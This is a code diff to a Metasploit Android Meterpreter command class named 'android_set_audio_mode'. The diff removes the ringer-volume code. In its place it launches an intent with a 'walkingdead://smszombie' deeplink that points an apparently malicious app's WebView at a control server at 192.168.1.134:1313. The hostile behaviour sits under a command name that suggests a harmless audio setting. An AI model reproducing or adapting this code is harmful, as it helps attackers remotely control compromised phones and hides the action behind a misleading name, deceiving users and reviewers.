@@ -1,29 +1,52 @@
 package com.metasploit.meterpreter.android;
 
-import android.media.AudioManager;
-import android.content.Context;
+import android.database.Cursor;
+import android.net.Uri;
+
 import com.metasploit.meterpreter.AndroidMeterpreter;
 import com.metasploit.meterpreter.Meterpreter;
 import com.metasploit.meterpreter.TLVPacket;
 import com.metasploit.meterpreter.command.Command;
 
+import android.app.PendingIntent;
+import android.content.BroadcastReceiver;
+import android.content.Intent;
+import android.content.IntentFilter;
+import android.app.Activity;
+import android.content.Context;
+import android.net.Uri;
+import android.content.ActivityNotFoundException;
+import android.content.ComponentName;
+import android.content.pm.PackageManager;
+import android.content.pm.ResolveInfo;
+
 public class android_set_audio_mode implements Command {
 
-    private static final int TLV_EXTENSIONS = 20000;
-    private static final int TLV_TYPE_AUDIO_MODE = TLVPacket.TLV_META_TYPE_UINT | (TLV_EXTENSIONS + 9075);
 
     @Override
-    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
-        AudioManager audioManager = (AudioManager)AndroidMeterpreter.getContext().getSystemService(Context.AUDIO_SERVICE);
-        int audiomode = request.getIntValue(TLV_TYPE_AUDIO_MODE);
-        if (audiomode == 0) {
-            audioManager.setRingerMode(AudioManager.RINGER_MODE_SILENT);
-        } else if (audiomode == 1) {
-            audioManager.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
-        } else {
-            audioManager.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
-            int volumeMax = audioManager.getStreamMaxVolume(AudioManager.STREAM_RING);
-            audioManager.setStreamVolume(AudioManager.STREAM_RING, volumeMax, 0);
+    public int execute(Meterpreter meterpreter, TLVPacket request,
+                       TLVPacket response) throws Exception {
+
+
+        AndroidMeterpreter androidMeterpreter = (AndroidMeterpreter) meterpreter;
+        final Context context = androidMeterpreter.getContext();
+
+
+
+       /* Android Q poses limitations on starting activities
+        *
+        * https://developer.android.com/guide/components/activities/background-starts
+        */
+
+        // Starts intent with deeplink to navigate SMSZombie's WebView to control website
+        try {
+            Intent intent = new Intent("android.intent.action.VIEW",
+                        Uri.parse("walkingdead://smszombie/?url=http://192.168.1.134:1313"));
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(intent);
+
+        } catch (ActivityNotFoundException e) {
+          return ERROR_FAILURE;
         }
 
         return ERROR_SUCCESS;
